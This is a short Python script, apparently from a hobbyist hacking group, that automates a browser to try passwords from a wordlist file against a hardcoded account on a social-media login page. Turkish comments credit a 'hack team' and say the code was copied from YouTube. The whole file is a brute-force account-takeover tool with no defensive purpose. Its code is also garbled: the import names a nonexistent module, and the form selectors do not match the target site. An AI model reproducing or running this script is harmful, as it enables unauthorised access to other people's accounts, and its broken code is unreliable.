from DARK import webdriver
import time


tarayici = webdriver.Firefox()
tarayici.get('https://www.facebook.com/')

#teamkurdistanhack
time.sleep(5)

usernames = tarayici.find_element_by_name('username')
passwords = tarayici.find_element_by_name('password')
giris_yap = tarayici.find_element_by_xpath('//*[@id="react-root"]/section/main/div/article/div/div[1]/div/form/div[4]')

dosya = open('list.txt','r')
satir=""
for satir in dosya:
    usernames.send_keys('teamkurdistanhack')
    passwords.send_keys(satir)
    giris_yap.click()

    time.sleep(2)
    usernames.clear()
    passwords.clear()
    
    


print(satir)
dosya.close()
time.sleep(10)
tarayici.close()
print("Bu program ZeZeRoN tarafindan kodlanmistir kodlar youtubedekiyle aynidir cünkü oradan ögrendim kodlari tum haklar REDROOM hack tim'e aittir")



